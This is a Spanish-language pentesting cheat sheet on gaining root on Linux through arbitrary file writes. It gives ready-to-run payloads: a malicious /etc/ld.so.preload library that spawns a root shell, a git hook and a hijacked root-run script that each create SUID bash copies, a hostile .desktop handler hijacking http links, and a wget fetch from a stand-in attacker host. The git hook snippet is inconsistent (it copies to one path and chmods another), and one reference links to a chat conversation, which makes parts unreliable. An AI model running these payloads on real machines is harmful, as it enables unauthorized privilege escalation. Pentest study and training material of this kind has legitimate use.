# Escritura arbitraria de archivos como root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Este archivo se comporta como la variable de entorno **`LD_PRELOAD`**, pero también funciona en **SUID binaries**.\
Si puedes crearlo o modificarlo, puedes simplemente añadir una **ruta a una biblioteca que se cargará** con cada binario ejecutado.

Por ejemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) son **scripts** que se **ejecutan** en varios **eventos** en un repositorio git, como cuando se crea un commit, una fusión... Así que si un **script o usuario privilegiado** realiza estas acciones con frecuencia y es posible **escribir en la carpeta `.git`**, esto puede usarse para **privesc**.

Por ejemplo, es posible **generar un script** en un repo git en **`.git/hooks`** para que siempre se ejecute cuando se crea un nuevo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron y archivos de tiempo

TODO

### Archivos de servicio y socket

TODO

### binfmt_misc

El archivo ubicado en `/proc/sys/fs/binfmt_misc` indica qué binario debe ejecutar qué tipo de archivos. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

Un atacante con permisos de escritura en los directorios de configuración de la víctima puede reemplazar o crear archivos que cambien el comportamiento del sistema, provocando ejecución de código no deseada. Al modificar el archivo `$HOME/.config/mimeapps.list` para apuntar los controladores de URL HTTP y HTTPS a un archivo malicioso (p. ej., estableciendo `x-scheme-handler/http=evil.desktop`), el atacante asegura que **al hacer clic en cualquier enlace http o https se ejecute el código especificado en ese archivo `evil.desktop`**. Por ejemplo, tras colocar el siguiente código malicioso en `evil.desktop` en `$HOME/.local/share/applications`, cualquier clic en una URL externa ejecuta el comando embebido:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Para más información consulta [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) donde se usó para explotar una vulnerabilidad real.

### Root ejecutando scripts/binarios escribibles por el usuario

Si un flujo de trabajo privilegiado ejecuta algo como `/bin/sh /home/username/.../script` (o cualquier binario dentro de un directorio propiedad de un usuario no privilegiado), puedes secuestrarlo:

- **Detecta la ejecución:** monitorea procesos con [pspy](https://github.com/DominicBreuker/pspy) para atrapar a root invocando rutas controladas por el usuario:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** asegúrate de que tanto el archivo objetivo como su directorio pertenezcan a tu usuario y sean escribibles.
- **Hijack the target:** haz una copia de seguridad del binary/script original y deja un payload que cree un SUID shell (o cualquier otra acción con root), luego restaura los permisos:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Activa la acción privilegiada** (p. ej., pulsando un botón de la UI que lanza el helper). Cuando root vuelva a ejecutar la ruta hijacked, captura el shell escalado con `./rootshell -p`.

## Referencias

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
